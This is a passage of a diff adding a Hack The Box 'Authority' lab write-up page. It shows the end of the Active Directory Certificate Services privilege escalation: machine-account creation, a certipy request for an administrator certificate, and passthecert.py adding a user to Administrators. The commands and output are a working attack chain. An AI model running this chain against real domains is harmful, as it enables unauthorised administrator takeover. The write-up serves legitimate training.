+sL2D1R+lZqU+znzTOVAlc4azlRX0tGwTaxcEG5UwpwV+A/0+JJfUhxELlpXy9EIB
+yVaUKYSUV5hZM996/YU8f0r1uUrblNFgqtStVz/LynCZkddPmQSV5v4W1T7tGAWn
+z3aeRrUCgYEA2+dR1RnwpBa1E/5cKFYn6Oq/siaMrmgFCG/crRyrG43gg0laSKKO
+zc7pPCQsGyx76A/vTMX4aAtjpHMpRVD+PsMmuJH4Ni7vuRwEdZSMK1LR+VGTUHVZ
+FMLcSX2CHf9xj9uz/LlWaVgrJl5++KS2aIZuJBjrX6AqypC69wFSbu8CgYEA8wwQ
+8RxeS+9hrr/Nbcq8ddY2ckeDAcddvPifU/2KyowoFqbbpFxM+G9nZhBfAqED8W4D
+KGxt/9/T4gJNtCdcTy0NkFtUwIl04MDPS8btaRpotmNutxkc7GdlwC8xrzbHQxZ/
+4yZLLLcVn97swdvFi0iNN63IBk4XhyjZjRALLtMCgYEApiuHb+PZLvWlwcT8+NIZ
++GyjjMiKmCQsYXK+K+Y0+m5ckHi2i5qjFKxdHMAswB/+RZ788mPK0TyCADuxnRqV
+9PFc6i4LhU40ggnE6ODmhrpfxum4yxzRwtl4wuPfljF4LAAWY0veG16vxJ+1jMhS
+umuTAR3/htQuYcG6Nnq+QusCgYEAkIHeGN2bG18LH1GfHOZrw0xINw5Z0FbvXwoc
+AV5AhUlsFHvFICZZBWWHfuHA+9ksdQHKEuDVTkuQuVJRTQoSEmlhJTGIZKnVukQp
+fI6cXd973uWj0G24Cr83elsVGW5ib3sTMsVz8PQygUmUT3cSL0xF2pMS2NzZlF0v
+bHXbkE0CgYBYwjlnDMw88qp2lYrWu1HpSN+XXA1jQV5k+9+g9WsvbIR1g8TysA2f
+avfkpyqrc1lCY9CMMdj3BGyWDo9mZBi0JrN/+khCvI50UB09lg7ymWjOmOPg2ljw
+6qcjUl3ry6SMDYtBKQtFlqyqjcza/d4h6zburhhs7apkkx4wq5FoYA==
+-----END RSA PRIVATE KEY-----
+
+[X] Error downloading certificate: Cert not yet issued yet! (iDisposition: 2)
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx
+
+
+
+Certify completed in 00:00:03.7714194
+</pre></div>
+</div>
+<p>So we need to be a computer right?</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>impacket-addcomputer<span class="w"> </span>authority.htb/svc_ldap:<span class="s1">&#39;lD****************&#39;</span><span class="w"> </span>-computer-name<span class="w"> </span>blnkn$<span class="w"> </span>-computer-pass<span class="w"> </span>blnkn
+
+Impacket<span class="w"> </span>v0.10.1.dev1+20220720.103933.3c6713e3<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2022</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation
+
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>added<span class="w"> </span>machine<span class="w"> </span>account<span class="w"> </span>blnkn$<span class="w"> </span>with<span class="w"> </span>password<span class="w"> </span>blnkn.
+</pre></div>
+</div>
+<p>Any domain joined user can do this because MachineAccountQuota is not set to 0, 10 is the default.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_ldap</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">Get</span><span class="o">-</span><span class="n">ADDomain</span> <span class="o">|</span> <span class="n">Select</span><span class="o">-</span><span class="n">Object</span> <span class="o">-</span><span class="n">ExpandProperty</span> <span class="n">DistinguishedName</span> <span class="o">|</span> <span class="n">Get</span><span class="o">-</span><span class="n">ADObject</span> <span class="o">-</span><span class="n">Properties</span> <span class="s1">&#39;ms-DS-MachineAccountQuota&#39;</span>
+
+
+<span class="n">DistinguishedName</span>         <span class="p">:</span> <span class="n">DC</span><span class="o">=</span><span class="n">authority</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
+<span class="n">ms</span><span class="o">-</span><span class="n">DS</span><span class="o">-</span><span class="n">MachineAccountQuota</span> <span class="p">:</span> <span class="mi">10</span>
+<span class="n">Name</span>                      <span class="p">:</span> <span class="n">authority</span>
+<span class="n">ObjectClass</span>               <span class="p">:</span> <span class="n">domainDNS</span>
+<span class="n">ObjectGUID</span>                <span class="p">:</span> <span class="mi">011</span><span class="n">a2802</span><span class="o">-</span><span class="n">ff7d</span><span class="o">-</span><span class="mi">4748</span><span class="o">-</span><span class="n">bd64</span><span class="o">-</span><span class="n">b7386cae0bd2</span>
+</pre></div>
+</div>
+<p>Trying to request the cert with certipy I get <code class="docutils literal notranslate"><span class="pre">rpc_s_access_denied</span></code>, not sure why</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>certipy<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;blnkn$&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;blnkn&#39;</span><span class="w"> </span>-ca<span class="w"> </span>AUTHORITY-CA<span class="w"> </span>-target<span class="w"> </span>authority.htb<span class="w"> </span>-template<span class="w"> </span>CorpVPN<span class="w"> </span>-upn<span class="w"> </span>administrator@authority.htb<span class="w"> </span>-dns<span class="w"> </span>authority.authority.htb<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.222
+Certipy<span class="w"> </span>v4.7.0<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Requesting<span class="w"> </span>certificate<span class="w"> </span>via<span class="w"> </span>RPC
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>error:<span class="w"> </span>rpc_s_access_denied
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Use<span class="w"> </span>-debug<span class="w"> </span>to<span class="w"> </span>print<span class="w"> </span>a<span class="w"> </span>stacktrace
+</pre></div>
+</div>
+<p>Attempting to do that directly from the machine with Certify.exe, looks like the machine flag isn’t really doing what I thought it did</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>./Certify.exe request /ca:authority.authority.htb\AUTHORITY-CA /template:CorpVPN /altname:Administrator /machine
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ &#39;__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Request a Certificates
+[*] Elevating to SYSTEM context for machine cert request
+
+[!] Unhandled Certify exception:
+
+System.AccessViolationException: Need to be in an elevated context
+   at Certify.Lib.Elevator.GetSystem(Action action)
+   at Certify.Commands.Request.Execute(Dictionary`2 arguments)
+   at Certify.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)
+   at Certify.Program.MainExecute(String commandName, Dictionary`2 parsedArgs)
+
+
+Certify completed in 00:00:00.0405701
+</pre></div>
+</div>
+<p>After a few attempts, that finally seems to have worked, not entirely sure what I was doing wrong</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>certipy<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;kermit-computer$&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;kermit-computer&#39;</span><span class="w"> </span>-target<span class="w"> </span><span class="s1">&#39;authority.htb&#39;</span><span class="w"> </span>-ca<span class="w"> </span><span class="s1">&#39;AUTHORITY-CA&#39;</span><span class="w"> </span>-template<span class="w"> </span><span class="s1">&#39;CorpVPN&#39;</span><span class="w"> </span>-upn<span class="w"> </span><span class="s1">&#39;administrator@authority.htb&#39;</span>
+Certipy<span class="w"> </span>v4.7.0<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Requesting<span class="w"> </span>certificate<span class="w"> </span>via<span class="w"> </span>RPC
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>requested<span class="w"> </span>certificate
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Request<span class="w"> </span>ID<span class="w"> </span>is<span class="w"> </span><span class="m">20</span>
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>certificate<span class="w"> </span>with<span class="w"> </span>UPN<span class="w"> </span><span class="s1">&#39;administrator@authority.htb&#39;</span>
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Certificate<span class="w"> </span>has<span class="w"> </span>no<span class="w"> </span>object<span class="w"> </span>SID
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>certificate<span class="w"> </span>and<span class="w"> </span>private<span class="w"> </span>key<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;administrator.pfx&#39;</span>
+</pre></div>
+</div>
+<p>Use Certipy to extract the key and cert from the <code class="docutils literal notranslate"><span class="pre">.pfx</span></code></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>certipy<span class="w"> </span>cert<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-nocert<span class="w"> </span>-out<span class="w"> </span>user.key
+certipy<span class="w"> </span>cert<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-nokey<span class="w"> </span>-out<span class="w"> </span>user.crt
+</pre></div>
+</div>
+<p>With openssl that would look like this:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>openssl<span class="w"> </span>rsa<span class="w"> </span>-in<span class="w"> </span>administrator.pfx
+openssl<span class="w"> </span>pkcs12<span class="w"> </span>-in<span class="w"> </span>administrator.pfx<span class="w"> </span>-nokeys
+</pre></div>
+</div>
+<p>Finally we can login to ldap as an admin with <code class="docutils literal notranslate"><span class="pre">passthecert.py</span></code> and add <code class="docutils literal notranslate"><span class="pre">svc_ldap</span></code> to the <code class="docutils literal notranslate"><span class="pre">administrators</span></code> group</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>passthecert.py<span class="w"> </span>-action<span class="w"> </span>ldap-shell<span class="w"> </span>-crt<span class="w"> </span>user.crt<span class="w"> </span>-key<span class="w"> </span>user.key<span class="w"> </span>-domain<span class="w"> </span>authority.htb<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.222
+Impacket<span class="w"> </span>v0.10.1.dev1+20220720.103933.3c6713e3<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2022</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation
+
+Type<span class="w"> </span><span class="nb">help</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>commands
+
+<span class="c1"># add_user_to_group svc_ldap Administrators</span>
+Adding<span class="w"> </span>user:<span class="w"> </span>svc_ldap<span class="w"> </span>to<span class="w"> </span>group<span class="w"> </span>Administrators<span class="w"> </span>result:<span class="w"> </span>OK
+
+<span class="c1">#</span>
+</pre></div>
+</div>
+<p>And boom we’re admin… Wow, that was a cool one</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_ldap</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">net</span> <span class="n">user</span> <span class="n">svc_ldap</span>
+<span class="n">User</span> <span class="n">name</span>                    <span class="n">svc_ldap</span>
+<span class="n">Full</span> <span class="n">Name</span>
+<span class="n">Comment</span>
+<span class="n">User</span><span class="s1">&#39;s comment</span>
+<span class="n">Country</span><span class="o">/</span><span class="n">region</span> <span class="n">code</span>          <span class="mi">000</span> <span class="p">(</span><span class="n">System</span> <span class="n">Default</span><span class="p">)</span>
+<span class="n">Account</span> <span class="n">active</span>               <span class="n">Yes</span>
+<span class="n">Account</span> <span class="n">expires</span>              <span class="n">Never</span>
+
+<span class="n">Password</span> <span class="n">last</span> <span class="nb">set</span>            <span class="mi">8</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2022</span> <span class="mi">9</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">31</span> <span class="n">PM</span>
+<span class="n">Password</span> <span class="n">expires</span>             <span class="n">Never</span>
+<span class="n">Password</span> <span class="n">changeable</span>          <span class="mi">8</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2022</span> <span class="mi">9</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">31</span> <span class="n">PM</span>
+<span class="n">Password</span> <span class="n">required</span>            <span class="n">Yes</span>
+<span class="n">User</span> <span class="n">may</span> <span class="n">change</span> <span class="n">password</span>     <span class="n">Yes</span>
+
+<span class="n">Workstations</span> <span class="n">allowed</span>         <span class="n">All</span>
+<span class="n">Logon</span> <span class="n">script</span>
+<span class="n">User</span> <span class="n">profile</span>
+<span class="n">Home</span> <span class="n">directory</span>
+<span class="n">Last</span> <span class="n">logon</span>                   <span class="mi">8</span><span class="o">/</span><span class="mi">5</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">3</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">58</span> <span class="n">PM</span>
+
+<span class="n">Logon</span> <span class="n">hours</span> <span class="n">allowed</span>          <span class="n">All</span>
+
+<span class="n">Local</span> <span class="n">Group</span> <span class="n">Memberships</span>      <span class="o">*</span><span class="n">Administrators</span>       <span class="o">*</span><span class="n">Remote</span> <span class="n">Management</span> <span class="n">Use</span>
+<span class="n">Global</span> <span class="n">Group</span> <span class="n">memberships</span>     <span class="o">*</span><span class="n">Domain</span> <span class="n">Users</span>
+<span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>
+</pre></div>
+</div>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../awkward/awkward.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Awkward</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../ambassador/ambassador.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Ambassador</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Authority</a><ul>
+<li><a class="reference internal" href="#enum">Enum</a></li>
+<li><a class="reference internal" href="#cracking-ansible-vault-secrets">Cracking Ansible Vault secrets</a></li>
+<li><a class="reference internal" href="#exploiting-pwm">Exploiting PWM</a></li>
+<li><a class="reference internal" href="#bloodhound">BloodHound</a></li>
+<li><a class="reference internal" href="#privesc">Privesc</a></li>
+<li><a class="reference internal" href="#exploiting-cve-202226923-by-abusing-active-directory-certificate-services-adcs">Exploiting CVE-2022–26923 by Abusing Active Directory Certificate Services (ADCS)</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
